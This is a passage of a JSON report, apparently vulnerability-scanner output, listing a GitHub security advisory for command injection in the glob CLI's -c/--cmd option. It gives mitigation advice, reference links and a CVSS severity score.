any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",
              "id": "GHSA-5j98-mcp5-4vw2",
              "modified": "2025-11-19T02:30:52Z",
              "published": "2025-11-17T17:38:56Z",
              "references": [
                {
                  "type": "WEB",
                  "url": "https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2"
                },
                {
                  "type": "ADVISORY",
                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64756"
                },
                {
                  "type": "WEB",
                  "url": "https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f"
                },
                {
                  "type": "WEB",
                  "url": "https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146"
                },
                {
                  "type": "PACKAGE",
                  "url": "https://github.com/isaacs/node-glob"
                }
              ],
              "schema_version": "1.7.3",
              "severity": [
                {
                  "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
                  "type": "CVSS_V3"
                }
              ],
              "summary": "glob CLI: Command injection via -c/--cmd executes matches with shell:true"
            }
          ]
        }
      ]
    }
  ],
  "experimental_config": {
    "licenses": {
      "summary": false,
      "allowlist": null
    }
  }
}
